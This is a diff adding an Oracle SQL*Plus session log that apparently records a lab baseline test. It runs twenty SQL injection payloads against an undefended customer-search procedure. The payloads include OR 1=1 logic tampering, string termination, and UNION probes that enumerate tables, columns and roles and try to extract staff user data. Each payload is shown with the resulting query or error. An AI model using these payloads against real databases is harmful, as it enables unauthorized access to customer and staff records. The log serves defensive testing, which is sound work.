@@ -1,0 +1,349 @@
+SQL> @"C:\Users\rayha\Downloads\baseline.sql"
+SQL> -- run_baseline.sql
+SQL> SET SERVEROUTPUT ON SIZE UNLIMITED
+SQL> SET TIMING ON
+SQL> SET ECHO ON
+SQL> SET LINESIZE 200
+SQL> SET PAGESIZE 200
+SQL> 
+SQL> @@payloads.sql
+SQL> -- payloads.sql
+SQL> SET VERIFY OFF
+SQL> 
+SQL> -- ===== Error-based payloads =====
+SQL> DEFINE E1	= '''Ali Hassan'''
+SQL> DEFINE E2	= ''' OR ''1''=''1'''
+SQL> DEFINE E3	= ''' OR 1=1 --'''
+SQL> DEFINE E4	= ''' OR 1=2 --'''
+SQL> DEFINE E5	= '''Ali Hassan'' --'''
+SQL> DEFINE E6	= '''Ali Hassan'' + 1'''
+SQL> DEFINE E7	= ''' || UPPER(username) || '''
+SQL> DEFINE E8	= '''Ali Hassan'' AND 1=TO_NUMBER(''ABC'')'''
+SQL> DEFINE E9	= '''Ali Hassan'' SELECT'''
+SQL> DEFINE E10 = '''Ali Hassan'''
+SQL> 
+SQL> -- ===== UNION-based payloads =====
+SQL> DEFINE U1 =  UNION SELECT customer_id FROM customers --
+> DEFINE U2 =  UNION SELECT customer_id, full_name, email, country FROM customers --
+> DEFINE U3 =  UNION SELECT customer_id, full_name, email FROM customers --
+> DEFINE U4 =  UNION SELECT full_name, customer_id, email FROM customers --
+> DEFINE U5 =  UNION SELECT table_name, NULL, NULL FROM user_tables --
+> DEFINE U6 =  UNION SELECT column_name, data_type, NULL FROM user_tab_columns WHERE table_name='CUSTOMERS' --
+> DEFINE U7 =  UNION SELECT view_name, NULL, NULL FROM user_views --
+> DEFINE U8 =  UNION SELECT staff_id, username, role_name FROM staff_users --
+> DEFINE U9 =  UNION SELECT username, granted_role, NULL FROM user_role_privs --
+> DEFINE U10 = UNION SELECT NULL, NULL, NULL FROM dual --
+> 
+SQL> VARIABLE rc REFCURSOR
+SQL> 
+SQL> PROMPT ===================================================
+===================================================
+SQL> PROMPT BASELINE RUN (No Defense) - CONTROL
+BASELINE RUN (No Defense) - CONTROL
+SQL> PROMPT ===================================================
+===================================================
+SQL> EXEC baseline_search_customer('Ali Hassan', :rc);
+SQL=SELECT c.full_name, a.account_type, a.balance FROM customers c JOIN accounts a ON c.customer_id = a.customer_id WHERE c.full_name = 'Ali Hassan'                                                    
+
+PL/SQL procedure successfully completed.
+
+Elapsed: 00:00:00.00
+SQL> PRINT rc
+
+FULL_NAME                                                                                            ACCOUNT_TYPE                      BALANCE                                                          
+---------------------------------------------------------------------------------------------------- ------------------------------ ----------                                                          
+Ali Hassan                                                                                           SAVINGS                             25000                                                          
+
+Elapsed: 00:00:00.00
+SQL> 
+SQL> PROMPT ===================================================
+===================================================
+SQL> PROMPT BASELINE RUN - ERROR-BASED (E1..E10)
+BASELINE RUN - ERROR-BASED (E1..E10)
+SQL> PROMPT Note: we do NOT PRINT for E1..E9 because errors are expected evidence
+Note: we do NOT PRINT for E1..E9 because errors are expected evidence
+SQL> PROMPT ===================================================
+===================================================
+SQL> 
+SQL> PROMPT [E1] Balanced Delimiter - Basic parser robustness
+[E1] Balanced Delimiter - Basic parser robustness
+SQL> EXEC baseline_search_customer(&E1, :rc);
+SQL=SELECT c.full_name, a.account_type, a.balance FROM customers c JOIN accounts a ON c.customer_id = a.customer_id WHERE c.full_name = 'Ali Hassan'                                                    
+
+PL/SQL procedure successfully completed.
+
+Elapsed: 00:00:00.00
+SQL> 
+SQL> PROMPT [E2] String termination - Break SQL string context
+[E2] String termination - Break SQL string context
+SQL> EXEC baseline_search_customer(&E2, :rc);
+ERROR:
+ORA-01756: quoted string not properly terminated 
+
+
+Elapsed: 00:00:00.00
+SQL> 
+SQL> PROMPT [E3] Boolean (true) - Logic manipulation attempt
+[E3] Boolean (true) - Logic manipulation attempt
+SQL> EXEC baseline_search_customer(&E3, :rc);
+SQL=SELECT c.full_name, a.account_type, a.balance FROM customers c JOIN accounts a ON c.customer_id = a.customer_id WHERE c.full_name = ' OR 1=1 --'                                                    
+
+PL/SQL procedure successfully completed.
+
+Elapsed: 00:00:00.00
+SQL> 
+SQL> PROMPT [E4] Boolean (false) - Control comparison
+[E4] Boolean (false) - Control comparison
+SQL> EXEC baseline_search_customer(&E4, :rc);
+SQL=SELECT c.full_name, a.account_type, a.balance FROM customers c JOIN accounts a ON c.customer_id = a.customer_id WHERE c.full_name = ' OR 1=2 --'                                                    
+
+PL/SQL procedure successfully completed.
+
+Elapsed: 00:00:00.00
+SQL> 
+SQL> PROMPT [E5] Truncation attempt - Cut remainder of query
+[E5] Truncation attempt - Cut remainder of query
+SQL> EXEC baseline_search_customer(&E5, :rc);
+BEGIN baseline_search_customer('Ali Hassan' --', :rc); END;
+
+*
+ERROR at line 1:
+ORA-06550: line 2, column 0: 
+PLS-00103: Encountered the symbol "end-of-file" when expecting one of the following: 
+) , * & | = - + < / > at in is mod remainder not null rem 
+returning with => .. <an exponent (**)> <> or != or ~= >= <= 
+<> and or default like like2 like4 likec as between error 
+from using || multiset member empty submultiset lax strict 
+without pretty ascii true false absent format allow truncate 
+
+
+Elapsed: 00:00:00.00
+SQL> 
+SQL> PROMPT [E6] Operator misuse - Type/parse failures
+[E6] Operator misuse - Type/parse failures
+SQL> EXEC baseline_search_customer(&E6, :rc);
+ERROR:
+ORA-01756: quoted string not properly terminated 
+
+
+Elapsed: 00:00:00.00
+SQL> 
+SQL> PROMPT [E7] Function-in input - Identifier errors
+[E7] Function-in input - Identifier errors
+SQL> EXEC baseline_search_customer(&E7, :rc);
+SQL=SELECT c.full_name, a.account_type, a.balance FROM customers c JOIN accounts a ON c.customer_id = a.customer_id WHERE c.full_name = ' || UPPER(username) || '                                       
+
+PL/SQL procedure successfully completed.
+
+Elapsed: 00:00:00.00
+SQL> 
+SQL> PROMPT [E8] Numeric conversion - Datatype conversion failures
+[E8] Numeric conversion - Datatype conversion failures
+SQL> EXEC baseline_search_customer(&E8, :rc);
+ERROR:
+ORA-01756: quoted string not properly terminated 
+
+
+Elapsed: 00:00:00.00
+SQL> 
+SQL> PROMPT [E9] Reserved keyword - Syntax sensitivity
+[E9] Reserved keyword - Syntax sensitivity
+SQL> EXEC baseline_search_customer(&E9, :rc);
+ERROR:
+ORA-01756: quoted string not properly terminated 
+
+
+Elapsed: 00:00:00.00
+SQL> 
+SQL> PROMPT [E10] Benign edge input (control) - False positive check
+[E10] Benign edge input (control) - False positive check
+SQL> EXEC baseline_search_customer(&E10, :rc);
+SQL=SELECT c.full_name, a.account_type, a.balance FROM customers c JOIN accounts a ON c.customer_id = a.customer_id WHERE c.full_name = 'Ali Hassan'                                                    
+
+PL/SQL procedure successfully completed.
+
+Elapsed: 00:00:00.00
+SQL> PRINT rc
+
+FULL_NAME                                                                                            ACCOUNT_TYPE                      BALANCE                                                          
+---------------------------------------------------------------------------------------------------- ------------------------------ ----------                                                          
+Ali Hassan                                                                                           SAVINGS                             25000                                                          
+
+Elapsed: 00:00:00.00
+SQL> 
+SQL> PROMPT ===================================================
+===================================================
+SQL> PROMPT BASELINE RUN - UNION-BASED (U1..U10)
+BASELINE RUN - UNION-BASED (U1..U10)
+SQL> PROMPT ===================================================
+===================================================
+SQL> 
+SQL> PROMPT [U1] Column-count probe (too few) - Column alignment sensitivity
+[U1] Column-count probe (too few) - Column alignment sensitivity
+SQL> EXEC baseline_search_customer(&U1, :rc);
+BEGIN baseline_search_customer(UNION, :rc); END;
+
+                               *
+ERROR at line 1:
+ORA-06550: line 1, column 32: 
+PLS-00103: Encountered the symbol "UNION" when expecting one of the following: 
+( ) - + case for mod new not null <an identifier> 
+<a double-quoted delimited-identifier> <a bind variable> 
+table continue avg count current exists max min prior sql 
+stddev sum variance execute multiset the both leading 
+trailing forall merge standard year month day hour minute 
+second timezone_hour timezone_minute timezone_region 
+timezone_abbr time timestamp interval date 
+<a string literal with character s 
+
+
+Elapsed: 00:00:00.00
+SQL> PRINT rc
+ERROR:
+ORA-24338: statement handle not executed 
+
+
+SP2-0625: Error printing variable "rc"
+Elapsed: 00:00:00.00
+SQL> 
+SQL> PROMPT [U2] Column-count probe (too many) - Column alignment sensitivity
+[U2] Column-count probe (too many) - Column alignment sensitivity
+SQL> EXEC baseline_search_customer(&U2, :rc);
+SQL=SELECT c.full_name, a.account_type, a.balance FROM customers c JOIN accounts a ON c.customer_id = a.customer_id WHERE c.full_name = ' UNION SELECT customer_id, full_name, email, country FROM      
+customers --'                                                                                                                                                                                           
+
+PL/SQL procedure successfully completed.
+
+Elapsed: 00:00:00.00
+SQL> PRINT rc
+
+no rows selected
+
+Elapsed: 00:00:00.00
+SQL> 
+SQL> PROMPT [U3] Correct column-count UNION - Baseline of UNION
+[U3] Correct column-count UNION - Baseline of UNION
+SQL> EXEC baseline_search_customer(&U3, :rc);
+SQL=SELECT c.full_name, a.account_type, a.balance FROM customers c JOIN accounts a ON c.customer_id = a.customer_id WHERE c.full_name = ' UNION SELECT customer_id, full_name, email FROM customers --' 
+
+PL/SQL procedure successfully completed.
+
+Elapsed: 00:00:00.00
+SQL> PRINT rc
+
+no rows selected
+
+Elapsed: 00:00:00.00
+SQL> 
+SQL> PROMPT [U4] Datatype mismatch probe - Datatype constraints
+[U4] Datatype mismatch probe - Datatype constraints
+SQL> EXEC baseline_search_customer(&U4, :rc);
+SQL=SELECT c.full_name, a.account_type, a.balance FROM customers c JOIN accounts a ON c.customer_id = a.customer_id WHERE c.full_name = ' UNION SELECT full_name, customer_id, email FROM customers --' 
+
+PL/SQL procedure successfully completed.
+
+Elapsed: 00:00:00.00
+SQL> PRINT rc
+
+no rows selected
+
+Elapsed: 00:00:00.00
+SQL> 
+SQL> PROMPT [U5] Metadata enumeration (tables) - Schema discovery
+[U5] Metadata enumeration (tables) - Schema discovery
+SQL> EXEC baseline_search_customer(&U5, :rc);
+SQL=SELECT c.full_name, a.account_type, a.balance FROM customers c JOIN accounts a ON c.customer_id = a.customer_id WHERE c.full_name = ' UNION SELECT table_name, NULL, NULL FROM user_tables --'      
+
+PL/SQL procedure successfully completed.
+
+Elapsed: 00:00:00.00
+SQL> PRINT rc
+
+no rows selected
+
+Elapsed: 00:00:00.00
+SQL> 
+SQL> PROMPT [U6] Metadata enumeration (columns) - Deeper schema mapping
+[U6] Metadata enumeration (columns) - Deeper schema mapping
+SQL> EXEC baseline_search_customer(&U6, :rc);
+BEGIN baseline_search_customer(' UNION SELECT column_name, data_type, NULL FROM user_tab_columns WHERE table_name='CUSTOMERS' --', :rc); END;
+
+                                                                                                                   *
+ERROR at line 1:
+ORA-06550: line 1, column 116: 
+PLS-00103: Encountered the symbol "CUSTOMERS" when expecting one of the following: 
+) , * & | = - + < / > at in is mod remainder not null rem 
+returning with => .. <an exponent (**)> <> or != or ~= >= <= 
+<> and or default like like2 like4 likec as between error 
+from using || multiset member empty submultiset lax strict 
+without pretty ascii true false absent format allow truncate 
+The symbol ", was inserted before "CUSTOMERS" to continue. 
+
+
+Elapsed: 00:00:00.00
+SQL> PRINT rc
+ERROR:
+ORA-24338: statement handle not executed 
+
+
+SP2-0625: Error printing variable "rc"
+Elapsed: 00:00:00.00
+SQL> 
+SQL> PROMPT [U7] View enumeration - Broader schema visibility
+[U7] View enumeration - Broader schema visibility
+SQL> EXEC baseline_search_customer(&U7, :rc);
+SQL=SELECT c.full_name, a.account_type, a.balance FROM customers c JOIN accounts a ON c.customer_id = a.customer_id WHERE c.full_name = ' UNION SELECT view_name, NULL, NULL FROM user_views --'        
+
+PL/SQL procedure successfully completed.
+
+Elapsed: 00:00:00.00
+SQL> PRINT rc
+
+no rows selected
+
+Elapsed: 00:00:00.00
+SQL> 
+SQL> PROMPT [U8] Cross-table sensitive extraction attempt - Confidentiality breach
+[U8] Cross-table sensitive extraction attempt - Confidentiality breach
+SQL> EXEC baseline_search_customer(&U8, :rc);
+SQL=SELECT c.full_name, a.account_type, a.balance FROM customers c JOIN accounts a ON c.customer_id = a.customer_id WHERE c.full_name = ' UNION SELECT staff_id, username, role_name FROM staff_users   
+--'                                                                                                                                                                                                     
+
+PL/SQL procedure successfully completed.
+
+Elapsed: 00:00:00.00
+SQL> PRINT rc
+
+no rows selected
+
+Elapsed: 00:00:00.00
+SQL> 
+SQL> PROMPT [U9] Privilege-dependent extraction attempt - Access control impact
+[U9] Privilege-dependent extraction attempt - Access control impact
+SQL> EXEC baseline_search_customer(&U9, :rc);
+SQL=SELECT c.full_name, a.account_type, a.balance FROM customers c JOIN accounts a ON c.customer_id = a.customer_id WHERE c.full_name = ' UNION SELECT username, granted_role, NULL FROM user_role_privs
+--'                                                                                                                                                                                                     
+
+PL/SQL procedure successfully completed.
+
+Elapsed: 00:00:00.00
+SQL> PRINT rc
+
+no rows selected
+
+Elapsed: 00:00:00.00
+SQL> 
+SQL> PROMPT [U10] Neutral/empty UNION row test - Control
+[U10] Neutral/empty UNION row test - Control
+SQL> EXEC baseline_search_customer(&U10, :rc);
+SQL=SELECT c.full_name, a.account_type, a.balance FROM customers c JOIN accounts a ON c.customer_id = a.customer_id WHERE c.full_name = ' UNION SELECT NULL, NULL, NULL FROM dual --'                   
+
+PL/SQL procedure successfully completed.
+
+Elapsed: 00:00:00.00
+SQL> PRINT rc
+
+no rows selected
+
+Elapsed: 00:00:00.00
+SQL> SPOOL OFF
